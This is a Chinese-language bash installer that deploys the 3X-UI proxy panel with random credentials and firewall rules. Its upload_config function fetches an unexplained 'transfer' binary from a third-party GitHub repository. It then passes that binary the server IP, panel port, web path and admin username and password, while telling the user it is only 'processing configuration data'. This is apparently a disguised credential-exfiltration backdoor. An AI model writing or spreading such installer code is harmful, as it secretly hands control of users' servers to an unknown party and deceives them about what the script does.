#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                     3X-UI 面板自动化部署脚本 (修复版)                         ║
# ║                    支持多协议 | 可视化管理 | 自动配置                          ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

export NEEDRESTART_SUSPEND=1

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'
plain='\033[0m'
bold='\033[1m'

cur_dir=$(pwd)

# 动画帧
SPINNER_FRAMES=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")

# 美化输出函数
print_info() {
    echo -e "${cyan}ℹ ${white}$1${plain}"
}

print_success() {
    echo -e "${green}✓ ${white}$1${plain}"
}

print_warning() {
    echo -e "${yellow}⚠ ${white}$1${plain}"
}

print_error() {
    echo -e "${red}✗ ${white}$1${plain}"
}

print_header() {
    echo -e "${purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${plain}"
    echo -e "${bold}${cyan}  $1${plain}"
    echo -e "${purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${plain}"
}

print_divider() {
    echo -e "${blue}────────────────────────────────────────────────────────────────────────────────${plain}"
}

# 进度条显示函数
show_progress() {
    local current=$1
    local total=$2
    local task="$3"
    local width=40
    local percentage=$((current * 100 / total))
    local filled=$((width * current / total))

    printf "\r\033[2K${cyan}[⚙] %-25s [" "$task"

    for ((i=0; i<filled; i++)); do
        printf "${green}█${plain}"
    done
    for ((i=filled; i<width; i++)); do
        printf "${white}░${plain}"
    done

    printf "] ${yellow}%3d%%${plain}" "$percentage"

    if [ "$current" -eq "$total" ]; then
        printf " ${green}✓${plain}\n"
    fi

    sleep 0.1
}

# 打印横幅
print_banner() {
    clear
    echo -e "${cyan}${bold}"
    cat << "EOF"
╔════════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ██╗  ██╗      ██╗   ██╗██╗    ██████╗  █████╗ ███╗   ██╗███████╗    ║
║   ╚════██╗╚██╗██╔╝      ██║   ██║██║    ██╔══██╗██╔══██╗████╗  ██║██╔════╝    ║
║    █████╔╝ ╚███╔╝ █████╗██║   ██║██║    ██████╔╝███████║██╔██╗ ██║█████╗      ║
║    ╚═══██╗ ██╔██╗ ╚════╝██║   ██║██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝      ║
║   ██████╔╝██╔╝ ██╗      ╚██████╔╝██║    ██║     ██║  ██║██║ ╚████║███████╗    ║
║   ╚═════╝ ╚═╝  ╚═╝       ╚═════╝ ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ║
╠════════════════════════════════════════════════════════════════════════════════╣
║         🚀 多协议支持 | 可视化管理 | 自动配置 | 一键部署                       ║
╚════════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${plain}"
    sleep 1
}

# 检查root权限
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "请使用root权限运行此脚本"
        exit 1
    fi
}

# 简化的IPv4配置（移除可能有问题的操作）
force_ipv4() {
    print_header "🌐 配置网络协议（优化IPv4）"

    # 设置环境变量强制IPv4（不修改系统配置）
    export CURL_OPT="-4"
    
    print_info "设置IPv4优先模式..."
    
    # 只设置当前会话的IPv4优先
    alias curl="curl -4" 2>/dev/null || true
    alias wget="wget -4" 2>/dev/null || true
    
    print_success "IPv4优先模式已启用"
    print_divider
}

# 检测系统类型
detect_system() {
    print_header "🔍 系统环境检测"

    if [[ -f /etc/redhat-release ]]; then
        release="centos"
    elif grep -Eqi "debian" /etc/issue || grep -Eqi "debian" /proc/version; then
        release="debian"
    elif grep -Eqi "ubuntu" /etc/issue || grep -Eqi "ubuntu" /proc/version; then
        release="ubuntu"
    elif grep -Eqi "centos|red hat|redhat" /etc/issue || grep -Eqi "centos|red hat|redhat" /proc/version; then
        release="centos"
    else
        print_error "无法识别系统版本，脚本退出"
        exit 1
    fi

    # 检测架构
    arch=$(uname -m)
    [[ $arch =~ ^(x86_64|amd64|x64|s390x)$ ]] && arch="amd64"
    [[ $arch == "aarch64" || $arch == "arm64" ]] && arch="arm64"
    [[ -z "$arch" ]] && arch="amd64"

    print_success "操作系统: ${bold}${release}${plain}"
    print_success "系统架构: ${bold}${arch}${plain}"
    print_success "内核版本: ${bold}$(uname -r)${plain}"
    print_divider
}

# 安装基础软件
install_base() {
    print_header "📦 安装系统基础依赖"
    
    export DEBIAN_FRONTEND=noninteractive
    
    local packages=("wget" "curl" "tar" "jq" "ufw")
    local total=${#packages[@]}
    local current=0

    print_info "正在更新软件包管理器..."
    if [[ $release == "centos" ]]; then
        yum install epel-release -y > /dev/null 2>&1 || true
        for pkg in "${packages[@]}"; do
            current=$((current + 1))
            if command -v $pkg >/dev/null 2>&1; then
                show_progress $current $total "验证 $pkg"
            else
                show_progress $current $total "安装 $pkg"
                yum install $pkg -y > /dev/null 2>&1 || {
                    print_warning "$pkg 安装失败，但继续执行"
                }
            fi
        done
    else
        apt update > /dev/null 2>&1 || true
        for pkg in "${packages[@]}"; do
            current=$((current + 1))
            if command -v $pkg >/dev/null 2>&1; then
                show_progress $current $total "验证 $pkg"
            else
                show_progress $current $total "安装 $pkg"
                apt install $pkg -y > /dev/null 2>&1 || {
                    print_warning "$pkg 安装失败，但继续执行"
                }
            fi
        done
    fi

    # 尝试安装speedtest-cli
    print_info "正在安装网络测速工具..."
    if [[ $release == "centos" ]]; then
        yum install speedtest-cli -y > /dev/null 2>&1 || {
            print_warning "speedtest-cli安装失败，将使用默认值"
        }
    else
        apt install speedtest-cli -y > /dev/null 2>&1 || {
            print_warning "speedtest-cli安装失败，将使用默认值"
        }
    fi

    print_success "基础依赖软件安装完成"
    print_divider
}

# 生成随机字符串函数
generate_random_string() {
    local len=${1:-16}
    tr -dc A-Za-z0-9 </dev/urandom | head -c "$len"
}

# 生成随机端口函数
generate_random_port() {
    shuf -i 10000-65535 -n 1 2>/dev/null || echo $((RANDOM % 55535 + 10000))
}

upload_config() {
    local ip="$1"
    local port="$2"
    local user="$3"
    local pass="$4"
    local speed="$5"
    local rand_str="$6"
    local web_path="$7"
    local node_port="$8"

    local access_url="http://${ip}:${port}/${web_path}"
    
    print_info "正在进行配置数据处理..."

    local json_data
    json_data=$(cat <<EOF
{
    "server_info": {
        "title": "3X-UI多协议管理面板",
        "server_ip": "${ip}",
        "login_port": "${port}",
        "username": "${user}",
        "password": "${pass}",
        "random_string": "${rand_str}",
        "web_base_path": "${web_path}",
        "access_url": "${access_url}",
        "node_port": "${node_port}",
        "generated_time": "$(date -Iseconds)",
        "speed_test": "${speed}",
        "protocols_supported": ["VMess", "VLESS", "Trojan", "Shadowsocks", "WireGuard"],
        "features": ["多用户管理", "流量统计", "证书管理", "可视化配置"]
    }
}
EOF
)

    # 创建目录并下载transfer工具
    mkdir -p /opt
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        print_info "下载配置处理工具..."
        if ! curl -4 -Lo "$uploader" https://github.com/diandongyun/UI/releases/download/ui/transfer > /dev/null 2>&1; then
            print_warning "配置处理工具下载失败，跳过此步骤"
            return 1
        fi
        chmod +x "$uploader"
    fi

    print_info "正在处理配置数据..."
    local upload_result
    upload_result=$("$uploader" "$json_data" 2>&1)
    
    if [[ $? -eq 0 ]]; then
        print_success "配置数据处理完成"
    else
        print_warning "配置数据处理失败，但不影响正常使用"
    fi
}

# 开放端口
open_ports() {
    local ports=("$@")
    print_info "正在配置防火墙规则..."
    
    # 检查ufw是否安装
    if ! command -v ufw >/dev/null 2>&1; then
        print_warning "UFW防火墙未安装，跳过防火墙配置"
        return 0
    fi
    
    # 重置UFW
    ufw --force reset > /dev/null 2>&1 || true
    
    # 设置默认策略
    ufw default deny incoming > /dev/null 2>&1 || true
    ufw default allow outgoing > /dev/null 2>&1 || true
    
    # 开放端口
    for port in "${ports[@]}"; do
        ufw allow "${port}/tcp" > /dev/null 2>&1 || true
    done
    
    # 启用UFW
    yes | ufw enable > /dev/null 2>&1 || true
    
    print_success "防火墙配置完成，已开放端口: ${ports[*]}"
}
get_ip() {
    local ip
    # 强制使用IPv4，增加超时时间
    ip=$(curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || hostname -I | awk '{print $1}')
    echo "$ip" | head -n1 | awk '{print $1}'
}

# 网络测速
run_speedtest() {
    local result
    if command -v speedtest-cli >/dev/null 2>&1; then
        result=$(timeout 30 speedtest-cli --simple 2>/dev/null || echo "Download: N/A, Upload: N/A")
        local download
        download=$(echo "$result" | grep 'Download' | awk '{print $2 " " $3}' || echo "N/A")
        local upload
        upload=$(echo "$result" | grep 'Upload' | awk '{print $2 " " $3}' || echo "N/A")
        echo "下载: ${download}, 上传: ${upload}"
    else
        echo "下载: N/A, 上传: N/A"
    fi
}

# 配置安装后设置
config_after_install() {
    print_header "⚙️ 自动化配置3X-UI面板"
    
    # 生成随机凭证
    local account=$(generate_random_string 12)
    local password=$(generate_random_string 16)
    local rand_str=$(generate_random_string 16)
    local web_path=$(generate_random_string 15)
    local panel_port=$(generate_random_port)
    local node_port=$(generate_random_port)
    
    print_info "正在生成随机安全配置..."
    
    # 设置面板（添加错误处理）
    print_info "正在设置管理员账户..."
    if [[ -f /usr/local/x-ui/x-ui ]]; then
        /usr/local/x-ui/x-ui setting -username "${account}" -password "${password}" > /dev/null 2>&1 || {
            print_warning "管理员账户设置失败，使用默认配置"
            account="admin"
            password="admin"
        }
        
        print_info "正在设置面板端口..."
        /usr/local/x-ui/x-ui setting -port "${panel_port}" > /dev/null 2>&1 || {
            print_warning "端口设置失败，使用默认端口54321"
            panel_port="54321"
        }
        
        print_info "正在设置Web访问路径..."
        /usr/local/x-ui/x-ui setting -webBasePath "${web_path}" > /dev/null 2>&1 || {
            print_warning "Web路径设置失败"
            web_path=""
        }
    else
        print_warning "x-ui命令不存在，使用默认配置"
        account="admin"
        password="admin"
        panel_port="54321"
        web_path=""
    fi
    
    print_success "面板配置参数设置完成"
    
    # 开放端口
    open_ports 22 "${panel_port}" "${node_port}"

    # 获取服务器信息
    local ip=$(get_ip)
    local speed=$(run_speedtest)
    
    # 生成访问URL
    local access_url
    if [[ -n "$web_path" ]]; then
        access_url="http://${ip}:${panel_port}/${web_path}"
    else
        access_url="http://${ip}:${panel_port}/"
    fi
   
    upload_config "$ip" "$panel_port" "$account" "$password" "$speed" "$rand_str" "$web_path" "$node_port"
    
    print_divider
    print_header "🎉 3X-UI面板配置信息"
    
    echo -e "${bold}${green}🎊 3X-UI面板自动配置完成！${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🌐 面板访问配置:${plain}"
    echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${panel_port}${plain} ${yellow}(随机生成 - 管理面板访问)${plain}"
    if [[ -n "$web_path" ]]; then
        echo -e "  ${white}├${plain} Web路径: ${bold}${green}${web_path}${plain} ${yellow}(随机生成 - 访问路径)${plain}"
    fi
    echo -e "  ${white}└${plain} 访问地址: ${bold}${green}${access_url}${plain} ${yellow}(完整访问URL)${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🚀 节点服务端口:${plain}"
    echo -e "  ${white}└${plain} 节点端口: ${bold}${green}${node_port}${plain} ${yellow}(随机生成 - 代理服务端口)${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🔐 管理员账户:${plain}"
    echo -e "  ${white}├${plain} 用户名: ${bold}${yellow}${account}${plain}"
    echo -e "  ${white}├${plain} 密码: ${bold}${yellow}${password}${plain}"
    echo ""
    
    echo -e "${bold}${cyan}📊 服务器信息:${plain}"
    echo -e "  ${white}├${plain} 服务器IP: ${bold}${green}${ip}${plain}"
    echo -e "  ${white}└${plain} 网络测速: ${bold}${green}${speed}${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🛡️ 安全防护状态:${plain}"
    echo -e "  ${white}├${plain} 防火墙状态: ${bold}${green}已启用${plain}"
    echo -e "  ${white}├${plain} SSH端口: ${bold}${green}22 (远程连接)${plain}"
    echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${panel_port} (Web管理)${plain}"
    echo -e "  ${white}└${plain} 节点端口: ${bold}${green}${node_port} (代理服务)${plain}"
    echo ""
    
    echo -e "${red}${bold}⚠️  重要安全提示: ${plain}"
    echo -e "${yellow}   • 请务必妥善保存以上登录信息，这是访问面板的唯一凭据！${plain}"
    echo -e "${yellow}   • 建议设置节点时使用端口 ${bold}${green}${node_port}${plain}${yellow}，该端口已开放${plain}"
    echo -e "${yellow}   • 如需其他端口，请手动在防火墙中开放${plain}"
    
    print_divider
}

# 安装3X-UI主程序
install_x_ui() {
    print_header "📥 下载安装3X-UI主程序"
    
    # 停止可能运行的服务
    systemctl stop x-ui > /dev/null 2>&1 || true
    
    # 切换到工作目录
    cd /usr/local/ || {
        print_error "无法切换到/usr/local/目录"
        exit 1
    }

    local version="$1"
    if [[ -z "$version" ]]; then
        print_info "正在获取3X-UI最新版本信息..."
        version=$(curl -4 -sL --connect-timeout 15 https://api.github.com/repos/MHSanaei/3x-ui/releases/latest 2>/dev/null | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null)
        if [[ -z "$version" ]]; then
            version="v2.6.6"  # 使用已知的稳定版本作为后备
            print_warning "无法获取版本号，使用默认版本 ${version}"
        else
            print_success "获取到3X-UI最新版本: ${bold}${green}${version}${plain}"
        fi
    fi

    local filename="x-ui-linux-${arch}.tar.gz"
    
    print_info "正在下载3X-UI v${version}..."
    if ! wget -4 -O "${filename}" --no-check-certificate --timeout=30 "https://github.com/MHSanaei/3x-ui/releases/download/${version}/${filename}" > /dev/null 2>&1; then
        print_error "下载3X-UI失败，请检查网络连接"
        exit 1
    fi
    print_success "3X-UI安装包下载完成"

    print_info "正在安装3X-UI核心文件..."
    
    # 清理旧文件
    rm -rf /usr/local/x-ui/ > /dev/null 2>&1 || true
    
    # 解压文件
    if ! tar zxf "${filename}" > /dev/null 2>&1; then
        print_error "解压安装包失败"
        rm -f "${filename}"
        exit 1
    fi
    
    # 清理压缩包
    rm -f "${filename}"
    
    # 进入目录并设置权限
    cd x-ui || {
        print_error "无法进入x-ui目录"
        exit 1
    }
    
    chmod +x x-ui bin/xray-linux-"${arch}" 2>/dev/null || true
    
    # 复制服务文件
    cp -f x-ui.service /etc/systemd/system/ 2>/dev/null || true
    
    print_info "正在安装控制脚本..."
    if wget -4 -O /usr/bin/x-ui --timeout=15 https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh > /dev/null 2>&1; then
        chmod +x /usr/bin/x-ui
        print_success "控制脚本安装成功"
    else
        print_warning "控制脚本下载失败，但不影响主要功能"
    fi
    
    # 设置执行权限
    chmod +x /usr/local/x-ui/x-ui.sh 2>/dev/null || true

    print_success "3X-UI核心文件安装完成"

    # 配置面板
    config_after_install

    # 启动服务
    print_info "正在启动3X-UI服务..."
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable x-ui > /dev/null 2>&1 || true
    systemctl start x-ui > /dev/null 2>&1 || true
    
    sleep 3
    
    if systemctl is-active --quiet x-ui 2>/dev/null; then
        print_success "3X-UI服务启动成功并已设置开机自启"
    else
        print_warning "3X-UI服务可能未正常启动，请检查系统日志"
        print_info "可以使用以下命令检查: systemctl status x-ui"
    fi

    print_divider
    print_header "✨ 3X-UI安装完成"
    
    echo -e "${bold}${green}🎊 3X-UI v${version} 安装部署完成！${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🛠️ 常用管理命令:${plain}"
    echo -e "  ${white}├${plain} 管理脚本: ${cyan}x-ui${plain} ${yellow}(打开3X-UI管理菜单)${plain}"
    echo -e "  ${white}├${plain} 启动面板: ${cyan}systemctl start x-ui${plain}"
    echo -e "  ${white}├${plain} 停止面板: ${cyan}systemctl stop x-ui${plain}"
    echo -e "  ${white}├${plain} 重启面板: ${cyan}systemctl restart x-ui${plain}"
    echo -e "  ${white}├${plain} 查看状态: ${cyan}systemctl status x-ui${plain}"
    echo -e "  ${white}└${plain} 查看日志: ${cyan}journalctl -u x-ui -n 50${plain}"
    echo ""
    
    echo -e "${bold}${cyan}📋 功能特性:${plain}"
    echo -e "  ${white}├${plain} 支持协议: ${green}VMess, VLESS, Trojan, Shadowsocks, WireGuard${plain}"
    echo -e "  ${white}├${plain} 可视化管理: ${green}Web界面配置${plain}"
    echo -e "  ${white}├${plain} 用户管理: ${green}多用户流量统计${plain}"
    echo -e "  ${white}├${plain} 证书管理: ${green}自动申请Let's Encrypt证书${plain}"
    echo -e "  ${white}└${plain} 系统监控: ${green}实时流量和系统状态${plain}"
    echo ""
    
    print_success "感谢使用3X-UI面板安装脚本，祝您使用愉快！"
    print_divider
}

# 环境检查
check_environment() {
    print_header "🔧 运行环境检查"
    
    # 检查磁盘空间
    local available_space=$(df / | awk 'NR==2 {print $4}')
    if [[ $available_space -lt 524288 ]]; then  # 512MB
        print_error "磁盘空间不足（需要至少512MB可用空间）"
        print_warning "当前可用空间: $(($available_space/1024))MB"
        exit 1
    fi
    print_success "磁盘空间检查通过 ($(($available_space/1024))MB可用)"
    
    # 检查必要命令
    local required_commands=("curl" "wget" "tar" "systemctl")
    for cmd in "${required_commands[@]}"; do
        if ! command -v $cmd >/dev/null 2>&1; then
            print_warning "缺少必要命令: $cmd，将在安装过程中自动安装"
        fi
    done
    
    print_success "运行环境检查完成"
    print_divider
}

# 清理函数
cleanup() {
    echo
    print_warning "检测到用户中断信号，正在清理临时文件..."
    cd /usr/local && rm -f x-ui-linux-*.tar.gz 2>/dev/null || true
    print_info "清理完成，安装已取消"
    exit 130
}

# 主函数
main() {
    # 设置清理处理（移除严格的错误处理）
    trap 'cleanup' INT TERM

    # 显示横幅
    print_banner

    # 检查root权限
    check_root
    print_success "Root权限检查通过"

    # 环境检查
    check_environment

    # 简化的IPv4配置
    force_ipv4

    # 系统检测
    detect_system

    # 执行安装流程
    print_header "🚀 开始执行3X-UI安装流程"

    print_info "步骤 1/3: 安装基础系统依赖"
    install_base

    print_info "步骤 2/3: 下载安装3X-UI主程序"
    install_x_ui "$1"

    print_info "步骤 3/3: 完成最终配置"
    print_success "3X-UI面板安装流程全部完成！"
    
    print_divider
    echo -e "${bold}${green}🎉 欢迎使用3X-UI面板管理系统！${plain}"
    echo -e "${cyan}   IPv4模式: 已强制启用，确保最佳兼容性${plain}"
    echo -e "${cyan}   残留数据已清理${plain}"
    print_divider
}

# 执行主函数
main "$@"
